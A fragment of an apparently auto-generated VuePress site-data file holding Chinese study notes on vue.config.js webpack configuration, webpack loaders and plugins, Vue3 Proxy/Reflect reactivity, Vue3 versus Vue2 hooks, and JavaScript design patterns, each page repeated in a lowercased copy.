`[name].${Version}.${Timestamp}.js`  //打包生成的文件\n        config.output.chunkFilename = `[name].${Version}.${Timestamp}.js`\n    },\n    // css相关\n    css: {\n        loaderOptions: {\n            // 配置全局sass\n            scss: {\n                additionalData: `@import \"@/assets/css/reset.scss\";@import \"@/assets/css/globle.scss\";`  //注意配置的键名\n            },\n            // lib-flexible\n            postcss: {\n                plugins: [\n                    //remUnit这个配置项的数值是多少呢？？？ 通常我们是根据设计图来定这个值，原因很简单，便于开发。\n                    //假如设计图给的宽度是750，我们通常就会把remUnit设置为75，这样我们写样式时，可以直接按照设计图标注的宽高来1:1还原开发。\n                    require('postcss-px2rem')({\n                        remUnit: 37.5\n                    })\n                ]\n            }\n        }\n    },\n    parallel: require('os').cpus().length > 1, // 是否为 Babel 或 TypeScript 使用 thread-loader。该选项在系统的 CPU 有多于一个内核时自动启用，仅作用于生产构建。\n    pwa: {}, // PWA 插件相关配置 \n    pluginOptions: {},  // 第三方插件配置\n};\n",
      "normalizedContent": "# vue.config.js配置案例\n\n// 打包多入口文件基本配置\nlet developmentpath = './';//开发环境-npm run serve时引用文件路径\nlet productionpath = './';//生产环境-npm run build打包后引用文件路径\n\nconst uglifyjsplugin = require('uglifyjs-webpack-plugin')//生产环境取消打印\nconst compressionwebpackplugin = require('compression-webpack-plugin')//gzip压缩\n\nconst productiongzipextensions = ['js', 'css']\nconst version = 'v6.1'\nconst timestamp = new date().gettime()\nfunction getpagesinfo() {\n    let pages = {}\n    const glob = require('glob') // 引入glob模块,用于扫描全部src/pages/**/main.js（返回的是一个数组）\n    glob.sync('src/pages/**/main.js').foreach((entry, i) => {\n        let name = entry.slice(10, -8)\n        pages[name] = {\n            entry: entry,\n            template: 'public.index.html',\n            filename: name + '.html',\n            title: '',\n            chunks: [\"chunk-vendors\", \"chunk-common\", name]\n        }\n    })\n    return pages\n}\n// 打包相关\nmodule.exports = {\n    pages: getpagesinfo(),//多页面应用配置\n    publicpath: process.env.node_env === 'production' ? productionpath : developmentpath, // 基本路径-引用文件的路 __dirname + '/server/dist', //build之后静态文件输出路径\n    assetsdir: 'static',//静态资源大包位置\n    outputdir: __dirname + '/server/dist', //build之后静态文件输出路径\n    lintonsave: process.env.node_env !== 'production',// 打包的时候eslint-loader检查 \n    productionsourcemap: false,//source map 检查\n    // 启动服务器\n    devserver: {\n        index: '/login.html',   //默认打开文件\n        open: true,             //自动打开浏览器\n        host: 'localhost',      //默认打开域名\n        port: 8080,             //默认打开端口号\n        https: false,           //开启关闭https请求\n        hotonly: false,         //热更\n        // 反向代理\n        proxy: {\n            // 配置跨域\n            '/api': {\n                target: 'http://dev.aabb.cn:8082/', //代理地址，这里设置的地址会代替axios中设置的baseurl\n                ws: true,   //// proxy websockets\n                changeorigin: true,// 如果接口跨域，需要进行这个参数配置\n                pathrewrite: {                //pathrewrite方法重写url\n                    '^/api': '/',\n                },\n            },\n            \"/api2\": {\n                    target: \"http://172.12.12.12:2018\",\n                    changeorigin: true,\n                    //ws: true,//websocket支持\n                    secure: false,\n                    pathrewrite: {\n                        \"^/api2\": \"/\"\n                    }\n                }\n        }\n    }\n    // webpack配置  链式\n    chainwebpack: (config) => {\n        // 1、取消预加载增加加载速度\n        config.plugins.delete('preload')\n        config.plugins.delete('prefetch')\n\n        // 2、vue中使用svg图标，并且想批量导入，然后需要使用的时候直接添加就可以\n        config.module\n            .rule('svg')\n            .exclude.add(resolve('src/assets/icons'))\n            .end()\n        config.module\n            .rule('icons')\n            .test(/\\.svg$/)\n            .include.add(resolve('src/assets/icons'))\n            .end()\n            .use('svg-sprite-loader')\n            .loader('svg-sprite-loader')\n            .options({\n                symbolid: 'icon-[name]',\n            })\n            .end()\n\n        // 3、图片处理\n        const imagesrule = config.module.rule('images')\n        imagesrule.uses.clear() //清除原本的images loader配置\n        imagesrule\n            .test(/\\.(jpg|gif|png|svg)$/)\n            .exclude.add(path.join(__dirname, '../node_modules')) //不对node_modules里的图片转base64\n            .end()\n            .use('url-loader')\n            .loader('url-loader')\n            .options({ name: 'img/[name].[hash:8].[ext]', limit: 6000000 })\n\n        config.optimization.splitchunks({\n            cachegroups: {\n\n                vendors: {\n                    name: 'chunk-vendors',\n                    minchunks: pagenum,\n                    test: /node_modules/,\n                    priority: -10,\n                    chunks: 'initial',\n                },\n\n                elementui: {\n                    name: 'chunk-elementui', // split elementui into a single package\n                    priority: 20, // the weight needs to be larger than libs and app or it will be packaged into libs or app\n                    test: /[\\\\/]node_modules[\\\\/]_?element-ui(.*)/, // in order to adapt to cnpm\n                },\n\n                commons: {\n                    name: 'chunk-commons',\n                    test: resolve('src/components'), // can customize your rules\n                    minchunks: 3, //  minimum common number\n                    priority: 5,\n                    reuseexistingchunk: true,\n                },\n            },\n        })\n    },\n    // webpack配置\n    configurewebpack: (config) => {\n          // 为生产环境修改配置\n        if (process.env.node_env === 'production') {\n      \n            config.plugins.push(\n                  // 1、取消打印\n                new uglifyjsplugin({\n                    uglifyoptions: {\n                        compress: {\n                            drop_debugger: true,//生产环境自动删除debugger\n                            drop_console: true, //生产环境自动删除console\n                        },\n                        warnings: false,\n                    },\n                    sourcemap: false,   //关掉sourcemap 会生成对于调试的完整的.map文件，但同时也会减慢打包速度\n                    parallel: true, //使用多进程并行运行来提高构建速度。默认并发运行数：os.cpus().length - 1。\n                }),\n\n                // 2、gzip压缩\n                new compressionwebpackplugin({\n                    filename: '[path].gz[query]',\n                    algorithm: 'gzip',\n                    test: new regexp('\\\\.(' + productiongzipextensions.join('|') + ')$'),\n                    threshold: 10240,\n                    minratio: 0.8,\n                })\n            )\n        }\n\n        // 在这里配置后，减少了压缩的包内容，需要在public/index.html通过cdn方式再引入,注意对应的版本\n        config.externals = { \n            vue: 'vue',\n            'vue-router': 'vuerouter',\n            vuex: 'vuex',\n            axios: 'axios',\n            jquery: '$',\n            moment: 'moment',\n            'mint-ui': 'mint'\n        },\n\n\n         // 别名配置\n        object.assign(config, {\n            // 开发生产共同配置\n            resolve: {\n                alias: {\n                '@': path.resolve(__dirname, './src'),\n                '@c': path.resolve(__dirname, './src/components'),\n                '@p': path.resolve(__dirname, './src/pages')\n                }\n            }\n        }),\n\n        config.output.filename = `[name].${version}.${timestamp}.js`  //打包生成的文件\n        config.output.chunkfilename = `[name].${version}.${timestamp}.js`\n    },\n    // css相关\n    css: {\n        loaderoptions: {\n            // 配置全局sass\n            scss: {\n                additionaldata: `@import \"@/assets/css/reset.scss\";@import \"@/assets/css/globle.scss\";`  //注意配置的键名\n            },\n            // lib-flexible\n            postcss: {\n                plugins: [\n                    //remunit这个配置项的数值是多少呢？？？ 通常我们是根据设计图来定这个值，原因很简单，便于开发。\n                    //假如设计图给的宽度是750，我们通常就会把remunit设置为75，这样我们写样式时，可以直接按照设计图标注的宽高来1:1还原开发。\n                    require('postcss-px2rem')({\n                        remunit: 37.5\n                    })\n                ]\n            }\n        }\n    },\n    parallel: require('os').cpus().length > 1, // 是否为 babel 或 typescript 使用 thread-loader。该选项在系统的 cpu 有多于一个内核时自动启用，仅作用于生产构建。\n    pwa: {}, // pwa 插件相关配置 \n    pluginoptions: {},  // 第三方插件配置\n};\n",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "loader和plugin",
      "frontmatter": {
        "title": "loader和plugin"
      },
      "regularPath": "/webstudy/%E5%B7%A5%E7%A8%8B%E5%8C%96/webpack-loader%E5%92%8Cplugin.html",
      "relativePath": "webstudy/工程化/webpack-loader和plugin.md",
      "key": "v-7e65d116",
      "path": "/webstudy/%E5%B7%A5%E7%A8%8B%E5%8C%96/webpack-loader%E5%92%8Cplugin.html",
      "headers": [
        {
          "level": 3,
          "title": "loader",
          "slug": "loader",
          "normalizedTitle": "loader",
          "charIndex": 2
        },
        {
          "level": 3,
          "title": "plugin",
          "slug": "plugin",
          "normalizedTitle": "plugin",
          "charIndex": 273
        }
      ],
      "headersStr": "loader plugin",
      "content": "# loader\n\n由于webpack 本身只能打包js文件，所以，针对css，图片等格式的文件没法打包，就需要引入第三方的模块进行打包。loader虽然是扩展了 webpack ，但是它只专注于转化文件（transform）这一个领域，完成压缩，打包，语言翻译。loader是运行在NodeJS中。\n\n * css-loader和style-loader模块是为了打包css的\n * babel-loader和babel-core模块时为了把ES6的代码转成ES5\n * url-loader和file-loader是把图片进行打包的\n\n\n# plugin\n\nplugin也是为了扩展webpack的功能，但是 plugin 是作用于webpack本身上的。而且plugin不仅只局限在打包，资源的加载上，它的功能要更加丰富。从打包优化和压缩，到重新定义环境变量，功能强大到可以用来处理各种各样的任务。webpack提供了很多开箱即用的插件CommonChunkPlugin主要用于提取第三方库和公共模块，避免首屏加载的bundle文件，或者按需加载的bundle文件体积过大，导致加载时间过长，是一把优化的利器。而在多页面应用中，更是能够为每个页面间的应用程序共享代码创建bundle\n\n * FileManagerPlugin配置打包后可自动压缩打包文件\n\nplugins:[\n  new FileManagerPlugin({\n    events:{\n      onEnd:{\n        delete:['./dist.zip'], //删除上次一打包的压缩文件\n        archieve:[\n          {\n            source:'./dist',\n            destination:'./dist.zip' //压缩\n          }\n        ]\n      }\n    }\n  })\n]\n\n\n\n * HtmlWebpackPlugin",
      "normalizedContent": "# loader\n\n由于webpack 本身只能打包js文件，所以，针对css，图片等格式的文件没法打包，就需要引入第三方的模块进行打包。loader虽然是扩展了 webpack ，但是它只专注于转化文件（transform）这一个领域，完成压缩，打包，语言翻译。loader是运行在nodejs中。\n\n * css-loader和style-loader模块是为了打包css的\n * babel-loader和babel-core模块时为了把es6的代码转成es5\n * url-loader和file-loader是把图片进行打包的\n\n\n# plugin\n\nplugin也是为了扩展webpack的功能，但是 plugin 是作用于webpack本身上的。而且plugin不仅只局限在打包，资源的加载上，它的功能要更加丰富。从打包优化和压缩，到重新定义环境变量，功能强大到可以用来处理各种各样的任务。webpack提供了很多开箱即用的插件commonchunkplugin主要用于提取第三方库和公共模块，避免首屏加载的bundle文件，或者按需加载的bundle文件体积过大，导致加载时间过长，是一把优化的利器。而在多页面应用中，更是能够为每个页面间的应用程序共享代码创建bundle\n\n * filemanagerplugin配置打包后可自动压缩打包文件\n\nplugins:[\n  new filemanagerplugin({\n    events:{\n      onend:{\n        delete:['./dist.zip'], //删除上次一打包的压缩文件\n        archieve:[\n          {\n            source:'./dist',\n            destination:'./dist.zip' //压缩\n          }\n        ]\n      }\n    }\n  })\n]\n\n\n\n * htmlwebpackplugin",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "Proxy",
      "frontmatter": {},
      "regularPath": "/webstudy/Vue3/Proxy.html",
      "relativePath": "webstudy/Vue3/Proxy.md",
      "key": "v-7ea5908c",
      "path": "/webstudy/Vue3/Proxy.html",
      "headers": [
        {
          "level": 2,
          "title": "Proxy demo",
          "slug": "proxy-demo",
          "normalizedTitle": "proxy demo",
          "charIndex": 12
        },
        {
          "level": 2,
          "title": "实现 Proxy-Observe",
          "slug": "实现-proxy-observe",
          "normalizedTitle": "实现 proxy-observe",
          "charIndex": 1425
        },
        {
          "level": 3,
          "title": "代码",
          "slug": "代码",
          "normalizedTitle": "代码",
          "charIndex": 1446
        },
        {
          "level": 3,
          "title": "Proxy 优势",
          "slug": "proxy-优势",
          "normalizedTitle": "proxy 优势",
          "charIndex": 3096
        },
        {
          "level": 2,
          "title": "Reflect（反射）",
          "slug": "reflect-反射",
          "normalizedTitle": "reflect（反射）",
          "charIndex": 3152
        },
        {
          "level": 2,
          "title": "ref 和 reactive",
          "slug": "ref-和-reactive",
          "normalizedTitle": "ref 和 reactive",
          "charIndex": 3431
        }
      ],
      "headersStr": "Proxy demo 实现 Proxy-Observe 代码 Proxy 优势 Reflect（反射） ref 和 reactive",
      "content": "# Proxy\n\n\n# Proxy demo\n\n<!DOCTYPE html>\n<html>\n  <head>\n    <meta charset=\"UTF-8\" />\n    <meta\n      name=\"viewport\"\n      content=\"width=device-width, initial-scale=1, minimum-scale=1,maximum-scale=1,user-scalable=no\"\n    />\n    <meta name=\"format-detection\" content=\"telephone=no\" />\n    <title>Observe demo</title>\n  </head>\n  <body>\n    <script src=\"./proxy-demo.js\">\n      //如何监听Array\n      // const data = [1,2,3,4]\n      //如何监听Object\n      const data = {\n        a:1,\n        b:2\n      }\n      const proxyData = new Proxy(data,{\n        get(target, key, receiver) {\n          // 只处理本身（非原型的）属性\n          const ownKeys = Reflect.ownKeys(target)\n          if(ownKeys.includes(key)){\n            console.log('get', key) // 此处监听\n          }\n          const result = Reflect.get(target, key, receiver)\n          console.log('result :>> ', result);\n          return result // 返回结果\n        },\n        set(target, key, val, receiver) {\n          // 重复的数据，不处理\n          if (val === target[key]) {\n            return true\n          }\n          const result = Reflect.set(target, key, val, receiver)\n          console.log('result', result) // true\n          return result // 是否设置成功\n        },\n        deleteProperty(target, key) {\n          const result = Reflect.deleteProperty(target, key)\n          console.log('result', result) // true\n          return result // 是否删除成功\n        }\n      })\n    </script>\n  </body>\n</html>\n\n\n\n# 实现 Proxy-Observe\n\n\n# 代码\n\n// 创建响应式\nfunction reactive(target = {}) {\n  if (typeof target !== \"object\" || target == null) {\n    // 不是对象或数组，则返回\n    return target;\n  }\n\n  // 代理配置\n  const proxyConf = {\n    get(target, key, receiver) {\n      // 只处理本身（非原型的）属性\n      const ownKeys = Reflect.ownKeys(target);\n      //判断当前target是否有此属性\n      if (ownKeys.includes(key)) {\n        console.log(\"get\", key); // 监听\n      }\n      const result = Reflect.get(target, key, receiver);\n      // 深度监听\n      // 性能如何提升的？\n      // vue2，一开始就直接将所有数据递归完成实现响应式\n      // 而vue3中，get到哪一个层级之后才进行递归，是一种惰性的操作\n      return reactive(result);\n    },\n    set(target, key, val, receiver) {\n      // 重复的数据，不处理\n      if (val === target[key]) {\n        return true;\n      }\n      //如何判断新增属性\n      //根据Reflect.ownKeys，通过比较现有的，来识别是否是新增的属性\n      const ownKeys = Reflect.ownKeys(target);\n      if (ownKeys.includes(key)) {\n        console.log(\"已有的 key\", key);\n      } else {\n        console.log(\"新增的 key\", key);\n      }\n\n      const result = Reflect.set(target, key, val, receiver);\n      console.log(\"set\", key, val);\n      // console.log('result', result) // true\n      return result; // 是否设置成功\n    },\n    deleteProperty(target, key) {\n      const result = Reflect.deleteProperty(target, key);\n      console.log(\"delete property\", key);\n      // console.log('result', result) // true\n      return result; // 是否删除成功\n    },\n  };\n\n  // 生成代理对象\n  const observed = new Proxy(target, proxyConf);\n  return observed;\n}\n\n// 测试数据\nconst data = {\n  name: \"hahaha\",\n  age: 20,\n  address: {\n    a: {\n      b: {\n        c: {\n          d: \"abc121211\",\n        },\n      },\n    },\n  },\n};\n//实现监听数据\nconst proxyData = reactive(data);\n\n\n\n# Proxy 优势\n\n * 深度监听，性能更好\n * 可以监听数组变化\n * 可以监听新增和删除对象属性\n\n\n# Reflect（反射）\n\nconst obj = { a: 1, b: 2, c: 3 };\n//检查对象中是否有某个属性\n\"a\" in obj; //true\nReflect.has(obj, \"a\"); //true\n//删除某属性\ndelete obj.a;\nReflect.deleteProperty(obj, \"a\"); //建议使用此Api\n//获取属性\nObject.getOwnPropertyNames(obj); ////['a','b','c']\nReflect.ownKeys(obj); //['a','b','c']\n\n\n\n# ref 和 reactive\n\n从定义数据角度对比：\n\n * ref 用来定义：基本类型数据。\n * reactive 用来定义：对象（或数组）类型数据。 备注：ref 也可以用来定义对象（或数组）类型数据, 它内部会自动通过 reactive 转为代理对象。 从原理角度对比：\n * ref 通过 Object.defineProperty()的 get 与 set 来实现响应式（数据劫持）。\n * reactive 通过使用 Proxy 来实现响应式（数据劫持）, 并通过 Reflect 操作源对象内部的数据。 从使用角度对比：\n * ref 定义的数据：操作数据需要.value，读取数据时模板中直接读取不需要.value。\n * reactive 定义的数据：操作数据与读取数据：均不需要.value。",
      "normalizedContent": "# proxy\n\n\n# proxy demo\n\n<!doctype html>\n<html>\n  <head>\n    <meta charset=\"utf-8\" />\n    <meta\n      name=\"viewport\"\n      content=\"width=device-width, initial-scale=1, minimum-scale=1,maximum-scale=1,user-scalable=no\"\n    />\n    <meta name=\"format-detection\" content=\"telephone=no\" />\n    <title>observe demo</title>\n  </head>\n  <body>\n    <script src=\"./proxy-demo.js\">\n      //如何监听array\n      // const data = [1,2,3,4]\n      //如何监听object\n      const data = {\n        a:1,\n        b:2\n      }\n      const proxydata = new proxy(data,{\n        get(target, key, receiver) {\n          // 只处理本身（非原型的）属性\n          const ownkeys = reflect.ownkeys(target)\n          if(ownkeys.includes(key)){\n            console.log('get', key) // 此处监听\n          }\n          const result = reflect.get(target, key, receiver)\n          console.log('result :>> ', result);\n          return result // 返回结果\n        },\n        set(target, key, val, receiver) {\n          // 重复的数据，不处理\n          if (val === target[key]) {\n            return true\n          }\n          const result = reflect.set(target, key, val, receiver)\n          console.log('result', result) // true\n          return result // 是否设置成功\n        },\n        deleteproperty(target, key) {\n          const result = reflect.deleteproperty(target, key)\n          console.log('result', result) // true\n          return result // 是否删除成功\n        }\n      })\n    </script>\n  </body>\n</html>\n\n\n\n# 实现 proxy-observe\n\n\n# 代码\n\n// 创建响应式\nfunction reactive(target = {}) {\n  if (typeof target !== \"object\" || target == null) {\n    // 不是对象或数组，则返回\n    return target;\n  }\n\n  // 代理配置\n  const proxyconf = {\n    get(target, key, receiver) {\n      // 只处理本身（非原型的）属性\n      const ownkeys = reflect.ownkeys(target);\n      //判断当前target是否有此属性\n      if (ownkeys.includes(key)) {\n        console.log(\"get\", key); // 监听\n      }\n      const result = reflect.get(target, key, receiver);\n      // 深度监听\n      // 性能如何提升的？\n      // vue2，一开始就直接将所有数据递归完成实现响应式\n      // 而vue3中，get到哪一个层级之后才进行递归，是一种惰性的操作\n      return reactive(result);\n    },\n    set(target, key, val, receiver) {\n      // 重复的数据，不处理\n      if (val === target[key]) {\n        return true;\n      }\n      //如何判断新增属性\n      //根据reflect.ownkeys，通过比较现有的，来识别是否是新增的属性\n      const ownkeys = reflect.ownkeys(target);\n      if (ownkeys.includes(key)) {\n        console.log(\"已有的 key\", key);\n      } else {\n        console.log(\"新增的 key\", key);\n      }\n\n      const result = reflect.set(target, key, val, receiver);\n      console.log(\"set\", key, val);\n      // console.log('result', result) // true\n      return result; // 是否设置成功\n    },\n    deleteproperty(target, key) {\n      const result = reflect.deleteproperty(target, key);\n      console.log(\"delete property\", key);\n      // console.log('result', result) // true\n      return result; // 是否删除成功\n    },\n  };\n\n  // 生成代理对象\n  const observed = new proxy(target, proxyconf);\n  return observed;\n}\n\n// 测试数据\nconst data = {\n  name: \"hahaha\",\n  age: 20,\n  address: {\n    a: {\n      b: {\n        c: {\n          d: \"abc121211\",\n        },\n      },\n    },\n  },\n};\n//实现监听数据\nconst proxydata = reactive(data);\n\n\n\n# proxy 优势\n\n * 深度监听，性能更好\n * 可以监听数组变化\n * 可以监听新增和删除对象属性\n\n\n# reflect（反射）\n\nconst obj = { a: 1, b: 2, c: 3 };\n//检查对象中是否有某个属性\n\"a\" in obj; //true\nreflect.has(obj, \"a\"); //true\n//删除某属性\ndelete obj.a;\nreflect.deleteproperty(obj, \"a\"); //建议使用此api\n//获取属性\nobject.getownpropertynames(obj); ////['a','b','c']\nreflect.ownkeys(obj); //['a','b','c']\n\n\n\n# ref 和 reactive\n\n从定义数据角度对比：\n\n * ref 用来定义：基本类型数据。\n * reactive 用来定义：对象（或数组）类型数据。 备注：ref 也可以用来定义对象（或数组）类型数据, 它内部会自动通过 reactive 转为代理对象。 从原理角度对比：\n * ref 通过 object.defineproperty()的 get 与 set 来实现响应式（数据劫持）。\n * reactive 通过使用 proxy 来实现响应式（数据劫持）, 并通过 reflect 操作源对象内部的数据。 从使用角度对比：\n * ref 定义的数据：操作数据需要.value，读取数据时模板中直接读取不需要.value。\n * reactive 定义的数据：操作数据与读取数据：均不需要.value。",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "vue3相比于vue2",
      "frontmatter": {
        "title:'vue3相比于vue2'": null
      },
      "regularPath": "/webstudy/Vue3/vue3%E7%9B%B8%E6%AF%94%E4%BA%8Evue2.html",
      "relativePath": "webstudy/Vue3/vue3相比于vue2.md",
      "key": "v-22109f78",
      "path": "/webstudy/Vue3/vue3%E7%9B%B8%E6%AF%94%E4%BA%8Evue2.html",
      "headers": [
        {
          "level": 2,
          "title": "对比",
          "slug": "对比",
          "normalizedTitle": "对比",
          "charIndex": 18
        },
        {
          "level": 3,
          "title": "1、vue3-composition API和vue2-options Api",
          "slug": "_1、vue3-composition-api和vue2-options-api",
          "normalizedTitle": "1、vue3-composition api和vue2-options api",
          "charIndex": 25
        },
        {
          "level": 3,
          "title": "2、生命周期",
          "slug": "_2、生命周期",
          "normalizedTitle": "2、生命周期",
          "charIndex": 1087
        },
        {
          "level": 3,
          "title": "3、vue3对全局API的优化",
          "slug": "_3、vue3对全局api的优化",
          "normalizedTitle": "3、vue3对全局api的优化",
          "charIndex": 1098
        },
        {
          "level": 3,
          "title": "4、ts的支持",
          "slug": "_4、ts的支持",
          "normalizedTitle": "4、ts的支持",
          "charIndex": 1264
        },
        {
          "level": 3,
          "title": "5、Proxy",
          "slug": "_5、proxy",
          "normalizedTitle": "5、proxy",
          "charIndex": 1276
        },
        {
          "level": 3,
          "title": "6、Fragment, Teleport, Suspense",
          "slug": "_6、fragment-teleport-suspense",
          "normalizedTitle": "6、fragment, teleport, suspense",
          "charIndex": 1288
        }
      ],
      "headersStr": "对比 1、vue3-composition API和vue2-options Api 2、生命周期 3、vue3对全局API的优化 4、ts的支持 5、Proxy 6、Fragment, Teleport, Suspense",
      "content": "# vue3相比于vue2\n\n\n# 对比\n\n\n# 1、vue3-composition API和vue2-options Api\n\n# hooks\n\n在此想到和vue2 mixin有关的缺陷就不解释，hooks的使用很好的规避使用mixin的问题\n\n * 使用Vue3的组合API封装的可复用的功能函数\n\n * 知道复用功能代码的引用来源, 不会出现像mixin这种隐式引用的弊端\n\n# 实现一个获取鼠标位置的hooks\n\nimport { ref, onMounted, onUnmounted, Ref } from 'vue'\ninterface Position {\n  x: Ref<number>,\n  y: Ref<number>\n}\nfunction getMousePosition(): Position {\n  const x = ref(0)\n  const y = ref(0)\n\n  const updateMouse = (e: MouseEvent) => {\n    x.value = e.pageX\n    y.value = e.pageY\n  }\n\n  onMounted(() => {\n    document.addEventListener('click', updateMouse)\n  })\n\n  onUnmounted(() => {\n    document.removeEventListener('click', updateMouse)\n  })\n\n  return { x, y }\n}\nexport default getMousePosition\n\n\n组件中使用\n\n<template>\n  <div>\n    <p>X: {{ x }}</p>\n    <p>Y: {{ y }}</p>\n  </div>\n</template>\n<script lang=\"ts\">\nimport { defineComponent} from 'vue'\n// 引入hooks\nimport getMousePosition from '../../hooks/MousePosition'\nexport default defineComponent({\n  setup () {\n    // 使用hooks功能\n    const { x, y } = useMousePosition()\n    return {\n      x,\n      y\n    }\n  }\n})\n</script>\n\n\n\n# 2、生命周期\n\n\n# 3、vue3对全局API的优化\n\n在 Vue3 中，全局和内部 API 都经过了重构，并考虑到了 tree-shaking 的支持。因此，全局 API现在只能作为 ES 模块构建的命名导出进行访问\n\nimport { nextTick } from 'vue'\nnextTick(() => {\n  //操作Dom\n})\n\n\n\n# 4、ts的支持\n\n\n# 5、Proxy\n\n\n# 6、Fragment, Teleport, Suspense\n\n * Fragment（碎片）告别一个template标签包起整个组件",
      "normalizedContent": "# vue3相比于vue2\n\n\n# 对比\n\n\n# 1、vue3-composition api和vue2-options api\n\n# hooks\n\n在此想到和vue2 mixin有关的缺陷就不解释，hooks的使用很好的规避使用mixin的问题\n\n * 使用vue3的组合api封装的可复用的功能函数\n\n * 知道复用功能代码的引用来源, 不会出现像mixin这种隐式引用的弊端\n\n# 实现一个获取鼠标位置的hooks\n\nimport { ref, onmounted, onunmounted, ref } from 'vue'\ninterface position {\n  x: ref<number>,\n  y: ref<number>\n}\nfunction getmouseposition(): position {\n  const x = ref(0)\n  const y = ref(0)\n\n  const updatemouse = (e: mouseevent) => {\n    x.value = e.pagex\n    y.value = e.pagey\n  }\n\n  onmounted(() => {\n    document.addeventlistener('click', updatemouse)\n  })\n\n  onunmounted(() => {\n    document.removeeventlistener('click', updatemouse)\n  })\n\n  return { x, y }\n}\nexport default getmouseposition\n\n\n组件中使用\n\n<template>\n  <div>\n    <p>x: {{ x }}</p>\n    <p>y: {{ y }}</p>\n  </div>\n</template>\n<script lang=\"ts\">\nimport { definecomponent} from 'vue'\n// 引入hooks\nimport getmouseposition from '../../hooks/mouseposition'\nexport default definecomponent({\n  setup () {\n    // 使用hooks功能\n    const { x, y } = usemouseposition()\n    return {\n      x,\n      y\n    }\n  }\n})\n</script>\n\n\n\n# 2、生命周期\n\n\n# 3、vue3对全局api的优化\n\n在 vue3 中，全局和内部 api 都经过了重构，并考虑到了 tree-shaking 的支持。因此，全局 api现在只能作为 es 模块构建的命名导出进行访问\n\nimport { nexttick } from 'vue'\nnexttick(() => {\n  //操作dom\n})\n\n\n\n# 4、ts的支持\n\n\n# 5、proxy\n\n\n# 6、fragment, teleport, suspense\n\n * fragment（碎片）告别一个template标签包起整个组件",
      "charsets": {
        "cjk": true
      }
    },
    {
      "title": "设计模式",
      "frontmatter": {
        "title": "设计模式"
      },
      "regularPath": "/webstudy/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F.html",
      "relativePath": "webstudy/设计模式/设计模式.md",
      "key": "v-59f4c2ee",
      "path": "/webstudy/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F.html",
      "headers": [
        {
          "level": 2,
          "title": "设计原则",
          "slug": "设计原则",
          "normalizedTitle": "设计原则",
          "charIndex": 11
        },
        {
          "level": 2,
          "title": "1、工厂模式",
          "slug": "_1、工厂模式",
          "normalizedTitle": "1、工厂模式",
          "charIndex": 45
        },
        {
          "level": 2,
          "title": "2、单例模式",
          "slug": "_2、单例模式",
          "normalizedTitle": "2、单例模式",
          "charIndex": 135
        },
        {
          "level": 2,
          "title": "3、代理模式",
          "slug": "_3、代理模式",
          "normalizedTitle": "3、代理模式",
          "charIndex": 711
        },
        {
          "level": 2,
          "title": "4、观察者模式",
          "slug": "_4、观察者模式",
          "normalizedTitle": "4、观察者模式",
          "charIndex": 805
        },
        {
          "level": 2,
          "title": "5、发布订阅模式",
          "slug": "_5、发布订阅模式",
          "normalizedTitle": "5、发布订阅模式",
          "charIndex": 946
        },
        {
          "level": 2,
          "title": "6、装饰器模式",
          "slug": "_6、装饰器模式",
          "normalizedTitle": "6、装饰器模式",
          "charIndex": 1137
        }
      ],
      "headersStr": "设计原则 1、工厂模式 2、单例模式 3、代理模式 4、观察者模式 5、发布订阅模式 6、装饰器模式",
      "content": "# 设计模式\n\n\n# 设计原则\n\n开放封闭原则是最重要的：对扩展开放，对修改封闭\n\n\n# 1、工厂模式\n\nclass Foo { \n}\n\nfunction factory(): Foo {\n    return new Foo(...arguments)\n}\n\n\n\n# 2、单例模式\n\n提供全局唯一的对象，无论获取多少次\n\nclass SingleTon {\n    public static instance:SingleTon|null = null\n    private constructor() {}\n    public static getInstance(): SingleTon {\n      //缓存instance\n      if(this.instance == null){\n        this.instance = new SingleTon()\n      }\n      return this.instance\n    }\n    fn1() {}\n    fn2() {}\n}\n\nconst s1 = new SingleTon() // Error: constructor of 'singleton' is private\n\nconst s2 = SingleTon.getInstance()\ns2.fn1()\ns2.fn2()\n\nconst s3 = SingleTon.getInstance()\ns2 === s3 // true\n\n\n应用场景\n\n * Vuex Redux 的 store ，全局唯一的\n * 全局唯一的 dialog modal\n\n\n# 3、代理模式\n\n使用者不能直接访问真实数据，而是通过一个代理层来访问。 ES Proxy 本身就是代理模式，Vue3 基于它来实现响应式\n\n应用场景\n\n * Vue3的proxy\n\n\n# 4、观察者模式\n\n即常说的绑定事件。一个主题，一个观察者，主题变化之后触发观察者执行。\n\n// 一个主题，一个观察者，主题变化之后触发观察者执行\nbtn.addEventListener('click', () => { ... })\n\n\n场景:\n\n * Vue响应式原理\n\n\n# 5、发布订阅模式\n\n即常说的自定义事件，一个 event 对象，可以绑定事件，可以触发事件 Vue中的事件总线传参\n\n// 绑定\nevent.on('event-key', () => {\n    // 事件1\n})\nevent.on('event-key', () => {\n    // 事件2\n})\n\n// 触发执行\nevent.emit('event-key')\n\n\n\n# 6、装饰器模式\n\nES 和 TS 的 Decorator 语法就是装饰器模式。可以为 class 和 method 增加新的功能。\n\nVue+ts的代码中用的就是装饰器模式\n\nimport { Vue, Prop,Emit ,Component} from 'vue-property-decorator'\n@Component({\n  components: {\n    HelloWorld\n  }\n})\nclass Demo extends Vue {\n  @Prop({ required: true, type: String }) msg\n  @Emit('custom')\n  @Provide() msg = this.msg\n  msg:string = 'this is decorator'\n}\n",
